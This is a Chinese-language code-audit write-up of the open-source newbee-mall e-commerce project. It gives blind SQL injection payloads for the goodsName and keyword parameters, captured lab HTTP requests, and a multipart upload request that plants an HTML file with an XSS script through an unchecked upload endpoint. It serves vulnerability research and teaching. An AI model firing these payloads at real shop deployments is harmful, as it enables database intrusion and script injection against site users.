---
title: newbee-mall
description: GitHub地址-https://github.com/newbee-ltd/newbee-mall
date: 2024-11-25 21:19:00+0000
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---

## 项目技术栈:spring boot+maven+mybatis

## 项目依赖审计

​	依赖项中引入并不多，而已引入的依赖项也并没有可以进行利用的漏洞。

## 单点漏洞审计

### SQL注入

​	在全局搜索中搜索${，搜到如下结果：

![img](/1-1732536691802-2.png)

​	我们逐个追踪

#### NewBeeMallGoodsMapper.xml

​	该文件中有四个地方使用了$，先追溯第一个：

##### 	goodsName

![img](/2-1732536691802-3.png)

​	向上追溯：

![img](/3-1732536691802-4.png)

​	可以看到路由是/goods/list，定位到前端的商品管理模块，抓包：

```http
GET /admin/goods/list?_search=false&nd=1732506895164&limit=20&page=1&sidx=&order=asc HTTP/1.1
Host: 192.168.83.43:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.83.43:8888/admin/goods
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802
Connection: close
```

这里我们构造一个参数goodsName

```http
GET /admin/goods/list?_search=false&nd=1732506895164&limit=20&page=1&sidx=&order=asc&goodsName=123 HTTP/1.1
Host: 192.168.83.43:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.83.43:8888/admin/goods
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802
Connection: close
```

​	可以发现成功筛选了商品，尝试注入。输入单引号后发现出现错误，尝试闭合SQL语句。测试后发现该注入点可进行SQL盲注

```sql
payload：')and+false%23。
```

##### 	keyword

##### ![img](/4-1732536691802-5.png)

​	向上追溯：

![img](/5-1732536691802-6.png)

​	发现路由为/search，猜测是前端的首页的搜索功能，进行搜索后抓包：

```http
GET /search?keyword=12312 HTTP/1.1
Host: 172.21.80.85:8888
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.80.85:8888/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5
Connection: close
```

​	尝试输入单引号，发现报错，尝试闭合后拼接语句。payload如下：

```sql
payload=')+or+false+and+concat('1
```

​	其余两个注入点与前两个注入点属于同一个功能的注入点，因此这里不再追溯审计

### 任意命令执行

​	没有找到使用了命令执行函数的功能点

### 任意文件操控（上传，读取，修改等）

​	搜索upload，定位到控制器

```java
@Controller
@RequestMapping("/admin")
public class UploadController {

    @PostMapping({"/upload/file"})
    @ResponseBody
    public Result upload(HttpServletRequest httpServletRequest, @RequestParam("file") MultipartFile file) throws URISyntaxException {
        String fileName = file.getOriginalFilename();
        String suffixName = fileName.substring(fileName.lastIndexOf("."));
        //生成文件名称通用方法
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Random r = new Random();
        StringBuilder tempName = new StringBuilder();
        tempName.append(sdf.format(new Date())).append(r.nextInt(100)).append(suffixName);
        String newFileName = tempName.toString();
        File fileDirectory = new File(Constants.FILE_UPLOAD_DIC);
        //创建文件
        File destFile = new File(Constants.FILE_UPLOAD_DIC + newFileName);
        try {
            if (!fileDirectory.exists()) {
                if (!fileDirectory.mkdir()) {
                    throw new IOException("文件夹创建失败,路径为：" + fileDirectory);
                }
            }
            file.transferTo(destFile);
            Result resultSuccess = ResultGenerator.genSuccessResult();
            resultSuccess.setData(NewBeeMallUtils.getHost(new URI(httpServletRequest.getRequestURL() + "")) + "/upload/" + newFileName);
            return resultSuccess;
        } catch (IOException e) {
            e.printStackTrace();
            return ResultGenerator.genFailResult("文件上传失败");
        }
    }

}
```

​	这里的代码在文件上传后又修改了文件的名字，所以无法进行目录穿透。但是并没有对文件后缀进行校验，也就是说存在任意文件上传，但是由于该项目不解析JSP所以进行getshell，但是我们可以尝试传一个html进行XSS攻击。

​	我们创建一个文本，内部嵌入XSSpayload，并修改为png进行上传，抓包后修改后缀提交，如下：

```http
POST /admin/upload/file HTTP/1.1
Host: 172.21.80.85:8888
Content-Length: 206
Cache-Control: max-age=0
Origin: http://172.21.80.85:8888
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQaWx03yAmO19jNCn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.80.85:8888/admin/carousels
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5
Connection: close

------WebKitFormBoundaryQaWx03yAmO19jNCn
Content-Disposition: form-data; name="file"; filename="XSS.html"
Content-Type: image/png

<script>alert(1)</script>
------WebKitFormBoundaryQaWx03yAmO19jNCn--

```

​	得到返回包中的URL后访问：

![image-20241125201120054](/image-20241125201120054.png)

## 前端渗透测试

### XSS

​	经过测试发现该项目多处，如：轮播图，热销商品等多处均存在XSS漏洞。且多为存储型XSS，但是由于是POST传参，所以利用难度较大。